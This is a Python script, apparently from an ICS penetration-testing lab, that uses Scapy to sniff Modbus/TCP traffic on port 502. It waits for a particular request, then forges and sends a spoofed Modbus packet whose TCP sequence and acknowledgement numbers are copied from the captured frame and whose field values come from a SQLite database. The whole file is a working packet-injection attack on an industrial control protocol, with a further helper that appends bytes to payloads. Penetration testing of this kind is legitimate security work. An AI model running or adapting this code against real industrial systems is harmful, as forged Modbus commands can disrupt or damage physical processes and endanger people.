import sqlite3
from scapy.all import *

class ModbusADU(Packet):
    name = "Modbus/TCP"
    fields_desc = [
        ShortField("Transaction_Identifier", 0),
        ShortField("Protocol_Identifier", 0),
        ShortField("Lenght", 0),
        ByteField("Unit_Identifier", 0)
    ]

class ModbusPDU01(Packet):
    name = "Modbus"
    fields_desc = [
        ByteField("Function_Code", 0),
        ShortField("Reference_Number", 0),
        ByteField("Byte_Count", 0),
        XByteField("Data", 0)
    ]

#bind_layers(TCP, ModbusADU, dport=502)
#bind_layers(ModbusADU, ModbusPDU01)


# Conectar con la base de datos SQLite
conn = sqlite3.connect('/home/kali/ICSPentesting/ICSPentesting/Attack/modbus_data.db')
c = conn.cursor()

# Función para capturar paquetes Modbus
def sniffing(iface):
    print("Capturando paquetes Modbus en la interfaz", iface)
    flag = True
    while flag:
        Modbus_frames = sniff(iface=iface, filter="tcp port 502", count=2)
        Modbus_query = Modbus_frames[1]
        Modbus_ack = Modbus_frames[0]

        if Raw in Modbus_query:
            modbus_data = Modbus_query[TCP].load
            if modbus_data[8:].hex() == "0001001103000000":
                print("Paquete detectado")
                flag = False
    return Modbus_query, Modbus_ack

# Función para extraer campos del paquete Modbus
def extract_modbus_data(pkt_ack, pkt_query):
    print("Extrayendo campos del paquete Modbus")
    ModbusLoad = pkt_query[TCP].load
    Transaction_Identifier = ModbusLoad[:2].hex()
    Client_Identifier = ModbusLoad[6:7].hex()
    Function_Code = ModbusLoad[7:8].hex()
    packet_type = 'Request' 
    ModbusQuery = get_modbus_packet(Transaction_Identifier, Client_Identifier, Function_Code, packet_type)

    ip_layer = IP(src=pkt_ack[IP].src, dst=pkt_ack[IP].dst)

    tcp_layer = TCP(sport=pkt_ack[TCP].sport, dport=pkt_ack[TCP].dport, flags="PA", window=pkt_ack[TCP].window, seq=pkt_ack[TCP].seq, ack=pkt_ack[TCP].ack)

    modbus_tcp_layer = ModbusADU(Transaction_Identifier=700, Protocol_Identifier=int(ModbusQuery[7],16), Lenght=int(ModbusQuery[8],16), Unit_Identifier=int(ModbusQuery[9],16))

    modbus_layer = ModbusPDU01(Function_Code=int(ModbusQuery[10],16), Reference_Number=int(ModbusQuery[11],16), Byte_Count=int(ModbusQuery[12],16), Data= 0)

    return ip_layer, tcp_layer, modbus_tcp_layer, modbus_layer

# Obtener respuesta Modbus desde la base de datos
def get_modbus_packet(transaction_id, client_id, function_code, packet_type):
    print("Obteniendo respuesta Modbus desde la base de datos")
    c.execute("SELECT * FROM modbus_data WHERE packet_type=? AND Transaction_Identifier=? AND Unit_Identifier=? AND Function_Code=?", (packet_type, transaction_id, client_id, function_code))
    packet = c.fetchone()
    if packet:
        return packet
    else:
        return None

# Función para inyectar datos en paquetes Modbus
def inject_data(pkt):
    print("Inyectando datos en paquetes Modbus")
    pkt[TCP].load += b'\x00\x01\x02\x03'
    return pkt

# Función principal
def main():
    iface = "lo"  
    print("Iniciando programa principal")
    pkt_query, pkt_ack = sniffing(iface)
    ip_layer, tcp_layer, modbus_tcp_layer, modbus_layer = extract_modbus_data(pkt_ack, pkt_query)
    modified_pkt = ip_layer / tcp_layer / modbus_tcp_layer / modbus_layer
    print("Paquete Modbus extraído:", modified_pkt)
    send(modified_pkt, verbose= 0, iface= "lo")  
    print("Paquete modificado enviado")

if __name__ == "__main__":
    main()
